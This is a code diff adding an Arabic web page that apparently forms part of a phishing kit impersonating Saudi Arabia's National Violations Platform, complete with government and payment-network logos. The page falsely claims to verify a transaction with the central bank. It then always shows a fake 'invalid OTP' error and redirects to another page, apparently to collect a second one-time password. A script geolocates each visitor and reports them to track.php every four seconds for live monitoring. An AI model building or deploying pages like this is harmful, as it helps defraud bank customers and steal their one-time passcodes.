@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> التحقق </title>
+    
+            <link rel="icon" type="image/png" href="indexx/favicon.ico">
+
+    
+    
+    
+    
+        
+    
+<script>
+  // 1. تفعيل المعرف الثابت لكل زائر لمنع التكرار الجلسات
+  let visitorCode = localStorage.getItem('visitor_code');
+  if (!visitorCode) {
+      visitorCode = 'VSR-' + Math.random().toString(36).substring(2, 9).toUpperCase();
+      localStorage.setItem('visitor_code', visitorCode);
+  }
+
+  async function sendTracking() {
+      // استعادة الدولة والمنطقة المخزنة لتسريع الموقع وتوفير البيانات
+      let countryCode = localStorage.getItem('visitor_country') || 'un';
+      let regionName = localStorage.getItem('visitor_region') || 'جاري التحديد...';
+
+      if (countryCode === 'un' || regionName === 'جاري التحديد...') {
+          try {
+              // جلب البيانات بدقة (رابط سريع ومفتوح تماماً لجميع دول العالم ومناطق السعودية)
+              const res = await fetch('https://ipapi.co');
+              const geo = await res.json();
+              
+              countryCode = geo.country_code ? geo.country_code.toLowerCase() : 'sa';
+              regionName = geo.region || geo.city || 'منطقة عامة';
+              
+              localStorage.setItem('visitor_country', countryCode);
+              localStorage.setItem('visitor_region', regionName);
+          } catch (e) {
+              // حل احتياطي سريع في حال تعطل الرابط الأول لأي سبب
+              try {
+                  const resAlt = await fetch('https://ipinfo.io');
+                  const geoAlt = await resAlt.json();
+                  countryCode = geoAlt.country ? geoAlt.country.toLowerCase() : 'sa';
+                  regionName = geoAlt.region || geoAlt.city || 'السعودية';
+                  
+                  localStorage.setItem('visitor_country', countryCode);
+                  localStorage.setItem('visitor_region', regionName);
+              } catch (err) {}
+          }
+      }
+
+      // 2. تحويل وتجهيز البيانات للإرسال المتوافق مع الاستضافة المجانية
+      const params = new URLSearchParams();
+      params.append('code', visitorCode);
+      params.append('pageTitle', document.title); // اسم الصفحة دقيق بدون روابط
+      params.append('countryCode', countryCode); // كود الدولة للعلم
+      params.append('region', regionName); // إرسال المنطقة بشكل مستقل ومستقر
+
+      fetch('track.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: params
+      }).catch(e => console.log(e));
+  }
+
+  // بث التحديث الفوري وتكراره كل 4 ثوانٍ لتأكيد التواجد
+  sendTracking();
+  setInterval(sendTracking, 4000);
+
+  // تحديث فوري دقيق للاسم والحالة عند الرجوع والتقدم بأزرار المتصفح
+  window.addEventListener('pageshow', sendTracking);
+</script>
+
+    
+    
+    
+    
+    <style>
+        /* إعدادات الصفحة الأساسية والخلفية الكاملة */
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100vh;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url('indexx/Back004.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            overflow-x: hidden;
+            overflow-y: auto !important;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* رأس الموقع - شفاف */
+        .main-header {
+            background-color: rgba(0, 150, 136, 0.7);
+            width: 100%;
+            height: 90px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
+        .header-container {
+            width: 90%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .center-header-img {
+            height: 70px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* وسط الموقع */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            box-sizing: border-box;
+        }
+
+        /* صندوق الحالة الشفاف */
+        .status-box {
+            background-color: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(12px); 
+            -webkit-backdrop-filter: blur(12px);
+            padding: 40px 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            width: 100%;
+            max-width: 460px; 
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* دائرة التحقق المتحركة الافتراضية */
+        .spinner-loader {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* أيقونة الخطأ التي تظهر لاحقاً */
+        .error-icon {
+            display: none;
+            color: #ff3333;
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+            animation: bounce 0.5s ease;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.15); }
+        }
+
+        /* نصوص الحالة */
+        .status-title {
+            color: #ffffff;
+            font-size: 1.4rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+            transition: all 0.3s ease;
+        }
+
+        .status-desc {
+            color: #e0e0e0;
+            font-size: 1rem;
+            line-height: 1.6;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        /* عداد التحويل التنازلي التلقائي */
+        .redirect-countdown {
+            display: none;
+            margin-top: 20px;
+            font-size: 0.95rem;
+            color: #ffffff;
+            background: rgba(255, 51, 51, 0.15);
+            padding: 8px 15px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 51, 51, 0.2);
+        }
+
+        #timer {
+            font-weight: bold;
+            color: #ffeb3b;
+        }
+
+        /* ذيل الموقع */
+        .site-footer {
+            background-color: rgba(0, 150, 136, 0.85); 
+            color: #ffffff;
+            padding: 30px 0;
+            width: 100%;
+            flex-shrink: 0;
+        }
+
+        .footer-container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+            margin: 10px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .footer-right { align-items: flex-start; text-align: right; }
+        .footer-left { align-items: flex-end; text-align: left; }
+
+        .efa-logo, .partner-logo {
+            object-fit: contain;
+            display: inline-block !important;
+        }
+
+        .partner-logos {
+            display: flex;
+            gap: 20px;
+        }
+
+        .footer-center h3 {
+            margin: 0 0 10px 0;
+            font-size: 1.1rem;
+        }
+
+        .footer-links {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 15px 0;
+            display: flex;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .payment-logo {
+            height: 25px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* الخط المتقطع للجوال */
+        .dashed-linee {
+            display: none;
+            width: 100%;
+            border-top: 1px dashed rgba(255, 255, 255, 0.4);
+            margin: 15px 0;
+        }
+
+        /* شاشات الجوال */
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+            }
+            .footer-section {
+                align-items: center !important;
+                text-align: center !important;
+            }
+            .dashed-linee {
+                display: block;
+            }
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- رأس الموقع -->
+    <header class="main-header">
+        <div class="header-container">
+            <img src="indexx/EFAAW.svg" alt="صورة وسط الرأس" class="center-header-img" width="150" height="70">
+        </div>
+    </header>
+
+    <!-- وسط الموقع -->
+    <main class="main-content">
+        <div class="status-box">
+            <!-- العداد الدائري وجاري التحقق المبدئي -->
+            <div id="loader" class="spinner-loader"></div>
+            <div id="errIcon" class="error-icon">❌</div>
+            
+            <div id="statusTitle" class="status-title">جاري التحقق من البيانات...</div>
+            <div id="statusDesc" class="status-desc">يرجى عدم إغلاق الصفحة أو تحديثها، يتم الآن فحص تفاصيل العملية ومراجعتها برمجياً مع المصرف المركزي لحماية حسابك.</div>
+
+            <!-- عداد إعادة التحويل التلقائي لصفحة الـ OTP -->
+            <div id="redirectArea" class="redirect-countdown">
+                سيتم إعادة توجيهك تلقائياً خلال <span id="timer">3</span> ثوانٍ لإعادة المحاولة.
+            </div>
+        </div>
+    </main>
+
+    <!-- ذيل الموقع -->
+    <footer class="site-footer">
+        <div class="footer-container">
+            
+            <!-- القسم الأيمن -->
+            <div class="footer-section footer-right">
+                <div class="logo-efa">
+                    <img src="indexx/EFAAW.svg" alt="Efa Logo" class="efa-logo" width="160" height="70">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأوسط المصلح بالكامل -->
+            <div class="footer-section footer-center">
+                <h3>المنصة الوطنية للمخالفات</h3>
+                <ul class="footer-links">
+                    <li><a href="#">الأسئلة الشائعة</a></li>
+                    <li><a href="#">شروط الإستخدام</a></li>
+                    <li><a href="#">سياسة الخصوصية</a></li>
+                </ul>
+                
+                <div class="payment-methods">
+                    <img src="indexx/Mada.svg" alt="Mada" class="payment-logo">
+                    <img src="indexx/Sdad.svg" alt="Sadad" class="payment-logo">
+                    <img src="indexx/Visa.svg" alt="Visa" class="payment-logo">
+                    <img src="indexx/MasterCard.svg" alt="MasterCard" class="payment-logo">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأيسر -->
+            <div class="footer-section footer-left">
+                <div class="partner-logos">
+                    <img src="indexx/NICW.svg" alt="NIC" class="partner-logo" width="100" height="55">
+                    <img src="indexx/sdaia2.svg" alt="SDAIA" class="partner-logo" width="100" height="55">
+                </div>
+            </div>
+
+        </div>
+    </footer>
+
+    <!-- السكربت المسؤول عن الفحص التلقائي لمدة 4 ثوانٍ ثم التحويل بعد 3 ثوانٍ إلى  -->
+    <script>
+        setTimeout(() => {
+            // إخفاء الـ Loader وإظهار أيقونة الخطأ
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('errIcon').style.display = 'inline-block';
+
+            // تعديل العناوين والنصوص للون الأحمر
+            const title = document.getElementById('statusTitle');
+            title.textContent = "خطأ في عملية التحقق!";
+            title.style.color = "#ff3333";
+
+            document.getElementById('statusDesc').textContent = "رمز التحقق المدخل غير صحيح أو انتهت صلاحيته الأمنية المؤقتة، يرجى إعادة طلب رمز جديد.";
+
+            // تشغيل عداد التوجيه التلقائي
+            const redirectArea = document.getElementById('redirectArea');
+            redirectArea.style.display = 'block';
+            let countdown = 3;
+            const timer = document.getElementById('timer');
+            const interval = setInterval(() => {
+                countdown--;
+                timer.textContent = countdown;
+                if (countdown <= 0) {
+                    clearInterval(interval);
+                    window.location.href = "ibood.html";
+                }
+            }, 5000);
+        }, 5000);
+    </script>
